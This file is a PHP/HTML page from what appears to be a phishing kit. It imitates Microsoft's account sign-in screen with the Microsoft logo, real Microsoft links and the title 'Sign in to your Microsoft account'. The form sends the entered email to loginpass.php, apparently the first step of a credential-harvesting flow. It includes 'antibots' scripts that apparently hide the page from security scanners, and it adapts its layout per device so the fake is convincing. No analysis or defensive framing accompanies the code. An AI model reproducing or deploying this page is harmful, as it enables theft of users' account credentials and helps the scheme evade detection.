<?php
session_start();
error_reporting(0);
include('antibots/bitch.php');
include('antibots/antibot.php');
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    
    <link rel="stylesheet" href="css/bootstrap.css" />
    <link rel="stylesheet" href="css/custm.css" />
    
    <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Montserrat|Roboto|Noto+Sans|Inter|Roboto+Condensed"/>
    
    <title>Sign in to your Microsoft account</title>
    <style type="text/css">
        @font-face{
            font-family: Segui;
            src: url('fonts/phagspa.ttf');
        }
        @font-face{
            font-family: Segbl;
            src: url('fonts/segoe_ui_bold.ttf');
        }
        body{
            zoom: .91;
        }
        .body, .bottom{
            padding-left: 25px;
            padding-right: 25px;
        }
        .body{
            display: -webkit-box;
            display: -moz-box;
            display: -ms-flexbox;
            display: -webkit-flex;
            display: flex;
            -webkit-justify-content: center;
            justify-content: center;
        }
        .body > div{
            max-width: 480px;
            width: 100%;
        }
        .body section{
            padding: 25px;
        }
        a{
            color: #0067B8;
        }
        .s1 a{
            font-size: 15px;
        }
        .s1 a:hover{
            color: grey;
            text-decoration: underline;
        }
        .ua:hover{
            text-decoration: underline;
        }
        form{
            width: 100%;
        }
        #email{
            width: 100%;
            outline: none;
            padding: 0;
            margin-bottom: 17px;
            border: none;
            border-radius: 0;
            -webkit-border-radius: 0;
            -moz-border-radius: 0;
            -khtml-border-radius: 0;
            border-bottom: 1px solid #353535;
            padding-bottom: 6px;
        }
        #email:focus{
            border-color: #0067B8;
        }
        .img-fluid{
            width: 118px;
        }
        .button-dark, .button-pri{
            padding: 5px;
            padding-left: 10px;
            padding-right: 10px;
            width: 120px;
            text-align: center;
            outline: none;
            border: none;
        }
        .button-dark{
            margin-right: 5px;
            background: #cccccc;
            color: black;
        }
        .button-dark:hover{
            background: #b7b7b7;
        }
        .button-pri{
            background: #036cbd;
            color: white;
        }
        .button-pri:hover{
            background: #024e88;
        }
        p, p a{
            font-size: 14px;
        }
        .opt{
            border: 1px solid grey;
            display: -webkit-box;
            display: -moz-box;
            display: -ms-flexbox;
            display: -webkit-flex;
            display: flex;
            vertical-align: center;
            width: 100%;
            margin-top: 20px;
        }
        .opt:hover{
            background: #d4d4d4;
        }
        .opt a{
            color: black;
            width: 100%;
            padding: 13px;
            font-size: 17px;
        }
        .opt img{
            margin-right: 0px;
            margin-left: 25px;
            width: 35px;
        }
        .bottom{
            font-size: 14px;
            display: -webkit-box;
            display: -moz-box;
            display: -ms-flexbox;
            display: -webkit-flex;
            display: flex;
            position: absolute;
            bottom: 0;
        }
        .bottom a{
            color: grey;
        }
        .bottom a div{
            font-size: 13px;
            padding: 10px;
            padding-top: 0;
            padding-bottom: 6px;
        }
        .df{
            display: -webkit-box;
            display: -moz-box;
            display: -ms-flexbox;
            display: -webkit-flex;
            display: flex;
            -webkit-justify-content: flex-end;
            justify-content: flex-end;
        }
        
        @media (min-width: 605px){
            body{
                background: #f2f2f2;
                background-size: cover;
                padding-left: 25px;
                padding-right: 25px;
                zoom: .91;
            }
            .body{
                position: absolute;
                top: 47%;
                left: 50%;
                transform: translateY(-50%) translateX(-50%);
                -ms-transform: translateY(-50%) translateX(-50%);
                -webkit-transform: translateY(-50%) translateX(-50%);
                -moz-transform: translateY(-50%) translateX(-50%);
                -o-transform: translateY(-50%) translateX(-50%);
            }
            .body > div{
                position: relative;
                min-width: 533px;
                width: 100%;
            }
            .body section{
                padding: 50px;
                background: white;
                margin: 25px;
                box-shadow: 0 0 5px 2px lightgrey;
            }
            .body .s2{
                padding: 0;

            }
            .bottom{
                left: none;
                right: 0;
            }
            .bottom a div{
                color: black;
                padding-left: 12px;
                padding-right: 12px;
            }
            .opt{
                border: none;
                margin: 0;
                padding-left: 25px;
            }
            .opt a, .opt i{
                margin: 0;
            }
        }
    </style>
</head>
<body>
    <div class="loader"></div>
    <div class="body"><div>
    <section class="s1">
    <div style="margin-bottom: 15px">
        <img class="img-fluid" src="images/microsoft-logo.svg" alt="logo" />
    </div>
    <h3 style="margin-bottom: 20px; font-size: 26px">Sign in</h3>
    <form action="loginpass.php" method="post">
        <input type="text" name="email" id="email" placeholder="Email, phone, or Skype" required/>
        <p style="margin-bottom: 18px">No account? <a href="https://login.live.com/oauth20_authorize.srf?client_id=4765445b-32c6-49b0-83e6-1d93765276ca&scope=openid+profile+https%3a%2f%2fwww.office.com%2fv2%2fOfficeHome.All&redirect_uri=https%3a%2f%2fwww.office.com%2flandingv2&response_type=code+id_token&state=EUE6yhIe_upjyK9GCdTwEW5AUdoDMUtBuDj2y6nwHrbySRunOB0lLwi73p8Ty6KERmBQMuWjVz5n4hKLejxGCr8X9PFLihZiznwvTjkXVic8hiIfLIbtEw3dWuLcsodH3PwY4UPJOzTWWL8GdTVXN-3MItvsHu88piX82CxQY7JctfR0COpKrUlgQ0ys62RZhRnNybfNKiT4YPpk7mX0txyQceRNBu1twRq8Eqz9DhVmo2vnxvdoAKDaD5ftWymlkFbdjCCzASj-BQee37x0ui6c20KGeZrOYFpR3GN0eUY&response_mode=form_post&nonce=637950346241081932.OWVmNTU2YzEtYjgxNC00YmI3LWIwZDctOWNhODA5MzNmMDViOGUyY2EyMjctNTBmZC00YzEyLThiNGEtNDAyMWQ2YzM4YWUw&x-client-SKU=ID_NETSTANDARD2_0&x-client-Ver=6.12.1.0&uaid=719273e45aed4ba78b724f835f630d95&msproxy=1&issuer=mso&tenant=common&ui_locales=en-US&signup=1&lw=1&fl=easi2&epct=AQABAAAAAAD--DLA3VO7QrddgJg7Wevr-jwJKJ8gnE9UY5J_1L-KtOfk_sZLCsrtG9uQy73p_YvXeZAutD1DkHYBvM4PzyL9IobB-AZr5jS7dxoD7Irwcs1I_e3u1DP1YI06fuoo029Q6ALq4e602ciouus2h6Q8CHPGAt2hnhB-iMo-iNZJwQplc_KE9rfxv1y09k2T6F2MdsezM_WFYlkU4GEMDzBOduOP-6EGxwXzO3cWMDGIWSAA&jshs=0">Create one!</a></p>
        <p class="sec-key"><a href="#">Sign in with a security key</a><img src="./images/quest.svg" alt="" style="margin-left: 3px; height: 18px; width: 18px"></p>
        <div class="df align-items-center" style="margin-top: 25px">
            <input type="submit" name="submit" class="button-pri" id="buttP" value="Next"/>
        </div>
    </form>
    </section>
    <section class="s2">
    <div class="opt">
        <img src="images/key.svg" />
        <a href="">Sign-in options</a>
    </div>
    </section>
    </div></div>
    <div class="bottom">
        <a class="ua" href="https://www.microsoft.com/en-US/servicesagreement/"><div>Terms of use</div></a>
        <a class="ua" href="https://privacy.microsoft.com/en-US/privacystatement"><div>Privacy & cookies</div></a>
        <a href="https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=4765445b-32c6-49b0-83e6-1d93765276ca&redirect_uri=https%3A%2F%2Fwww.office.com%2Flandingv2&response_type=code%20id_token&scope=openid%20profile%20https%3A%2F%2Fwww.office.com%2Fv2%2FOfficeHome.All&response_mode=form_post&nonce=637950346241081932.OWVmNTU2YzEtYjgxNC00YmI3LWIwZDctOWNhODA5MzNmMDViOGUyY2EyMjctNTBmZC00YzEyLThiNGEtNDAyMWQ2YzM4YWUw&ui_locales=en-US&mkt=en-US&client-request-id=719273e4-5aed-4ba7-8b72-4f835f630d95&state=EUE6yhIe_upjyK9GCdTwEW5AUdoDMUtBuDj2y6nwHrbySRunOB0lLwi73p8Ty6KERmBQMuWjVz5n4hKLejxGCr8X9PFLihZiznwvTjkXVic8hiIfLIbtEw3dWuLcsodH3PwY4UPJOzTWWL8GdTVXN-3MItvsHu88piX82CxQY7JctfR0COpKrUlgQ0ys62RZhRnNybfNKiT4YPpk7mX0txyQceRNBu1twRq8Eqz9DhVmo2vnxvdoAKDaD5ftWymlkFbdjCCzASj-BQee37x0ui6c20KGeZrOYFpR3GN0eUY&x-client-SKU=ID_NETSTANDARD2_0&x-client-ver=6.12.1.0&sso_reload=true#" style="font-weight: bold; font-size: 16px"><div>· · ·</div></a>
    </div>
    <script>
        var buttP = document.getElementById("buttP"), buttG = document.getElementById("buttG");
        var sKey = document.querySelector(".sec-key");
        var h3 = document.querySelector("h3");
        var sect = document.getElementsByTagName("section");
        if( /iPhone|iPad|iPod/.test(navigator.userAgent) ) {
            for(let i = 0; i < sect.length; i++){
                sect[i].style.padding = "25px";
                sect[i].style.paddingLeft = "0px";
                sect[i].style.paddingRight = "0px";
            }
            document.body.style.zoom = "normal";
            document.body.style.fontFamily = "Segui";
            h3.style.fontFamily = "Segbl";
            sKey.style.display = "none";
            document.write('<meta name="viewport" content="width=device-width,height='+window.innerHeight+', initial-scale=0.91">');
            buttP.style.borderRadius = "5px";
            buttG.style.borderRadius = "5px";
        
        }else if( /Mobile|Android|iP(hone|od)|Blackberry|Kindle|Silk-Accelerated|(hpw|web)OS|Opera M(obi|ini)/.test(navigator.userAgent)){
            sKey.style.display = "none";
            document.write('<meta name="viewport" content="width=device-width,height='+window.innerHeight+', initial-scale=1.0">');
            for(let i = 0; i < sect.length; i++){
                sect[i].style.padding = "25px";
                sect[i].style.paddingLeft = "0px";
                sect[i].style.paddingRight = "0px";
            }
            document.body.style.zoom = .97;
        }else{
        sKey.style.display = "block";
        document.write('<meta name="viewport" content="width=device-width,height='+window.innerHeight+', initial-scale=1.0">');
        }
        function back(){
            history.go(-1);
        }
    </script>
    <script src="js/bootstrap.js"></script>
</body>
</html>